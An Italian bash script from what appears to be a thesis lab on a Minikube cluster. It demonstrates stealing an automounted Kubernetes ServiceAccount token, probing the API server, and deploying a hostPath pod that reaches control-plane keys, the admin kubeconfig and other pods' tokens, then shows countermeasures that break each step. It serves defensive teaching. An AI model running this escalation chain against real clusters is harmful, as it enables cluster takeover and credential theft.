#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A1 - Furto del token del ServiceAccount automontato
#                           e movimento laterale verso il controllo del cluster
#
# Riprende la misconfig 1 (STRIDE riga 4, "Automounted high-privilege
# ServiceAccount tokens") e ne mostra lo SFRUTTAMENTO end-to-end, come
# documentato in letteratura:
#   - MITRE ATT&CK for Containers T1528 "Steal Application Access Token"
#     e T1610 "Deploy Container";
#   - Microsoft Threat Matrix for Kubernetes, "Container service account";
#   - NSA/CISA Kubernetes Hardening Guidance 1.2 (2022), sez. token & RBAC.
#
# SCENARIO (coerente con il threat model della tesi): l'attaccante ha gia' un
# foothold nel pod piu' esposto (openPDC / bridge PMU, che riceve traffico
# dall'esterno). Da li' la catena e':
#   1. legge il token del ServiceAccount, montato automaticamente in ogni pod;
#   2. con quel token parla con l'API server (egress non filtrato) e scopre
#      cosa l'identita' CONDIVISA puo' fare;
#   3. [LAB] sfruttando un permesso plausibile dell'identita' condivisa
#      (create pods -- un over-grant comune), crea un pod che monta il
#      filesystem del nodo. Poiche' i pod girano anche sul control plane
#      (misconfig 2, riga 8), quel pod legge /etc/kubernetes/pki del nodo di
#      controllo: e' il controllo del cluster.
#   4. [LAB DEFENSE] le contromisure spezzano ogni anello della catena.
#
# Questo e' un laboratorio DIDATTICO e DIFENSIVO: mostra impatto e difesa sul
# cluster di prova (Minikube). NON e' uno strumento offensivo: non esfiltra
# dati, non stampa chiavi private (solo la PROVA di accesso, cioe' `ls`), non
# lascia nulla sul cluster (trap EXIT). Da eseguire SOLO sul proprio cluster.
#
# Uso:
#   ./04-attacco-token-lateral-movement.sh [namespace]        # recon (solo letture)
#   LAB=1 ./04-attacco-token-lateral-movement.sh              # + catena di escalation
#   LAB=1 DEFENSE=1 ./04-attacco-token-lateral-movement.sh    # + contromisure che la bloccano
# =============================================================================
set -euo pipefail

NS="${1:-smartgrid}"
LAB="${LAB:-0}"
DEFENSE="${DEFENSE:-0}"
SA="system:serviceaccount:${NS}:default"
ATK_POD="attacker-hostpath"          # pod creato con il token rubato (passo 3)
ATK_ROLE="lab-operator-createpods"   # over-grant plausibile simulato in LAB
ATK_BIND="lab-operator-createpods-binding"
DEF_NS="smartgrid-lab-restricted"    # namespace con Pod Security "restricted" (DEFENSE)
PAUSE_IMAGE="${PAUSE_IMAGE:-registry.k8s.io/pause:3.10}"
BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"

line() { printf '\n=== %s\n' "$1"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
# aggiunge il padding '=' mancante a una stringa base64url, per decodificare il JWT
b64pad() { local s="$1"; while [ $(( ${#s} % 4 )) -ne 0 ]; do s="${s}="; done; printf '%s' "$s"; }
need kubectl
kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }

# -----------------------------------------------------------------------------
# 1. Foothold: scelgo il pod piu' esposto e verifico che il token sia montato
# -----------------------------------------------------------------------------
POD="$(kubectl get pods -n "$NS" -l smartgrid.io/role=openpdc -o name 2>/dev/null | head -n1)"
[ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -o name | head -n1)"
[ -n "$POD" ] || { echo "nessun pod nel namespace '$NS'"; exit 1; }
POD="${POD#pod/}"

line "1. Foothold nel pod piu' esposto: $POD"
echo "-- quale identita' usa e il token e' montato automaticamente?"
kubectl get pod "$POD" -n "$NS" \
  -o custom-columns='POD:.metadata.name,SA:.spec.serviceAccountName,AUTOMOUNT:.spec.automountServiceAccountToken'
echo "   (SA vuoto = 'default'; AUTOMOUNT vuoto = default true => token montato)"

TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
echo "-- il token e' davvero nel filesystem del pod?"
kubectl exec -n "$NS" "$POD" -- ls -l "$TOKEN_PATH" 2>/dev/null \
  || { echo "   token non presente (gia' mitigato?)"; }

# -----------------------------------------------------------------------------
# 2. Uso del token: identita' e permessi visti dall'attaccante (T1528)
# -----------------------------------------------------------------------------
line "2. L'attaccante legge il token e scopre chi e' e cosa puo' fare (T1528)"
TOKEN="$(kubectl exec -n "$NS" "$POD" -- cat "$TOKEN_PATH" 2>/dev/null || true)"
if [ -z "$TOKEN" ]; then
  echo "   nessun token da rubare: la catena si ferma qui. (vedi contromisure)"
else
  echo "-- identita' nel token (claim 'sub' del JWT; nessun valore segreto):"
  # decodifico solo il payload del JWT per mostrare l'identita', non le firme
  PAYLOAD="$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')"
  b64pad "$PAYLOAD" | base64 -d 2>/dev/null | tr ',' '\n' \
    | grep -E '"sub"|"namespace"|"serviceaccount"' \
    || echo "   (payload non decodificabile in questo ambiente; non e' importante per la demo)"
  echo "-- l'API server e' raggiungibile dal pod e accetta il token?"
  kubectl exec -n "$NS" "$POD" -- sh -c '
    T=$(cat '"$TOKEN_PATH"')
    code=$(wget -q -O /dev/null -S --no-check-certificate \
        --header="Authorization: Bearer $T" \
        "https://kubernetes.default.svc/api/v1/namespaces/'"$NS"'/pods" 2>&1 \
        | awk "/HTTP\//{print \$2; exit}")
    echo "   HTTP dall API server: ${code:-nessuna risposta}  (200=puo leggere i pod, 403=token valido ma non autorizzato)"
  ' 2>/dev/null || echo "   (immagine senza wget: il punto -- token valido e API raggiungibile -- resta)"
  echo "-- cosa puo' fare questa identita' CONDIVISA oggi (RBAC effettivo):"
  kubectl auth can-i --list -n "$NS" --as="$SA" 2>/dev/null | head -n 15 || true
fi

# -----------------------------------------------------------------------------
# 3. [LAB] Catena di escalation documentata: create pods -> nodo -> cluster
# -----------------------------------------------------------------------------
if [ "$LAB" = "1" ] && [ -n "$TOKEN" ]; then
  cleanup() {
    set +e
    kubectl delete pod "$ATK_POD" -n "$NS" --ignore-not-found --grace-period=0 >/dev/null 2>&1
    kubectl delete rolebinding "$ATK_BIND" -n "$NS" --ignore-not-found >/dev/null 2>&1
    kubectl delete role "$ATK_ROLE" -n "$NS" --ignore-not-found >/dev/null 2>&1
    kubectl delete ns "$DEF_NS" --ignore-not-found >/dev/null 2>&1
    echo "(pulizia: pod, role/rolebinding e namespace di laboratorio rimossi)"
  }
  trap cleanup EXIT

  line "3. [LAB] L'identita' condivisa riceve un permesso plausibile: create pods"
  echo "   In letteratura 'create pods' equivale al compromesso del nodo"
  echo "   (Peirates S0683; controlplane/BishopFox): si crea un pod che monta"
  echo "   il filesystem dell'host. Simulo questo over-grant sul SA 'default'."
  kubectl create role "$ATK_ROLE" -n "$NS" --verb=create,get,list --resource=pods
  kubectl create rolebinding "$ATK_BIND" -n "$NS" \
    --role="$ATK_ROLE" --serviceaccount="${NS}:default"

  echo "-- l'attaccante agisce usando SOLO il token rubato (--token), senza credenziali admin:"
  kubectl --token="$TOKEN" auth can-i create pods -n "$NS" 2>/dev/null \
    && echo "   => puo' creare pod." || echo "   => non puo' creare pod (catena interrotta)."

  echo "-- crea un pod che monta il filesystem del NODO (hostPath: /) in sola lettura:"
  kubectl --token="$TOKEN" apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: $ATK_POD
  namespace: $NS
  labels: { app.kubernetes.io/name: attacco-token-lab }
spec:
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 0
  containers:
  - name: probe
    image: $BUSYBOX_IMAGE
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 120"]
    volumeMounts:
    - { name: host, mountPath: /host, readOnly: true }
  volumes:
  - name: host
    hostPath: { path: / }
EOF
  kubectl wait pod "$ATK_POD" -n "$NS" --for=condition=Ready --timeout=90s 2>/dev/null || true
  NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
  echo "   pod schedulato sul nodo: ${NODE:-?}"

  echo "-- PROVA DI IMPATTO (solo 'ls'/conteggi, nessuna chiave o credenziale stampata):"
  kubectl exec -n "$NS" "$ATK_POD" -- sh -c '
    echo "   materiale crittografico del control plane leggibile dal nodo:"
    found=0
    # Minikube mette le CA in /etc/kubernetes/pki (kubeadm) o /var/lib/minikube/certs
    for d in /host/etc/kubernetes/pki /host/var/lib/minikube/certs; do
      if [ -d "$d" ]; then
        echo "     $d:"; ls -1 "$d" 2>/dev/null | sed "s/^/       /" | head; found=1
      fi
    done
    # il kubeconfig admin: leggerlo equivale a cluster-admin
    for f in /host/etc/kubernetes/admin.conf /host/etc/kubernetes/super-admin.conf; do
      [ -f "$f" ] && { echo "     kubeconfig admin leggibile: $f  (= cluster-admin)"; found=1; }
    done
    [ "$found" = 0 ] && echo "     (percorsi noti non trovati: driver diverso? prova: find /host -maxdepth 4 -name ca.key)"
    echo "   token di altri pod montati sul nodo (riutilizzabili per muoversi lateralmente):"
    n=$(find /host/var/lib/kubelet/pods -name token 2>/dev/null | wc -l)
    echo "     file token raggiungibili: $n"
  ' || true
  echo "   => con hostPath + pod sul control plane, l'attaccante legge le CA e il"
  echo "      kubeconfig admin del cluster e i token dei pod del nodo: dal pod esposto"
  echo "      al controllo del cluster."
  kubectl delete pod "$ATK_POD" -n "$NS" --grace-period=0 >/dev/null 2>&1 || true

  # ---------------------------------------------------------------------------
  # 4. [LAB DEFENSE] Le contromisure spezzano ogni anello
  # ---------------------------------------------------------------------------
  if [ "$DEFENSE" = "1" ]; then
    line "4. [LAB] Le contromisure: ogni anello della catena si spezza"

    echo "-- (a) automountServiceAccountToken: false => niente token da rubare (passo 1-2):"
    kubectl run def-noauto -n "$NS" --image="$PAUSE_IMAGE" --restart=Never \
      --overrides='{"spec":{"automountServiceAccountToken":false}}' >/dev/null 2>&1 || true
    kubectl wait pod def-noauto -n "$NS" --for=condition=Ready --timeout=60s >/dev/null 2>&1 || true
    if kubectl exec -n "$NS" def-noauto -- ls "$TOKEN_PATH" >/dev/null 2>&1; then
      echo "   token ancora presente (inatteso)"
    else
      echo "   token ASSENTE nel pod: il passo 1 fallisce."
    fi
    kubectl delete pod def-noauto -n "$NS" --grace-period=0 --ignore-not-found >/dev/null 2>&1 || true

    echo "-- (b) least privilege => tolgo l'over-grant e l'identita' non puo' piu' creare pod (passo 3):"
    kubectl delete rolebinding "$ATK_BIND" -n "$NS" --ignore-not-found >/dev/null 2>&1
    kubectl delete role "$ATK_ROLE" -n "$NS" --ignore-not-found >/dev/null 2>&1
    printf "   auth can-i create pods (come %s): " "$SA"
    kubectl auth can-i create pods -n "$NS" --as="$SA" 2>/dev/null || true
    echo "   => senza il RoleBinding l'azione del passo 3 è negata. Nel chart corretto"
    echo "      ogni componente ha un SA dedicato che non ha questo permesso."

    echo "-- (c) Pod Security Admission 'restricted' => il pod con hostPath e' rifiutato (passo 3):"
    kubectl create ns "$DEF_NS" >/dev/null 2>&1 || true
    kubectl label ns "$DEF_NS" \
      pod-security.kubernetes.io/enforce=restricted --overwrite >/dev/null 2>&1 || true
    echo "   provo a creare lo stesso pod hostPath nel namespace 'restricted' (dry-run lato server):"
    kubectl apply --dry-run=server -f - <<EOF 2>&1 | sed 's/^/   /' || true
apiVersion: v1
kind: Pod
metadata: { name: $ATK_POD, namespace: $DEF_NS }
spec:
  containers:
  - { name: probe, image: $BUSYBOX_IMAGE, command: ["sh","-c","sleep 1"] }
  volumes:
  - { name: host, hostPath: { path: / } }
EOF
    echo "   => hostPath vietato dalla policy 'restricted': niente mount del nodo."
    kubectl delete ns "$DEF_NS" --ignore-not-found >/dev/null 2>&1 || true
  fi
fi

# -----------------------------------------------------------------------------
echo
echo "RIEPILOGO DELLA CATENA (misconfig 1 + 2):"
echo "  token SA montato nel pod esposto  ->  T1528 Steal Application Access Token"
echo "  API server raggiungibile          ->  egress non filtrato dal pod"
echo "  identita' condivisa con 'create pods' -> T1610 Deploy Container"
echo "  pod con hostPath sul control plane -> lettura CA/token del cluster"
echo
echo "CONTROMISURE (vedi README e README-demos sez. 1):"
echo "  automountServiceAccountToken:false  |  SA dedicato a minimo privilegio"
echo "  NetworkPolicy egress verso l'API    |  Pod Security 'restricted' (no hostPath)"
echo "  taint sul control plane (misconfig 2)"
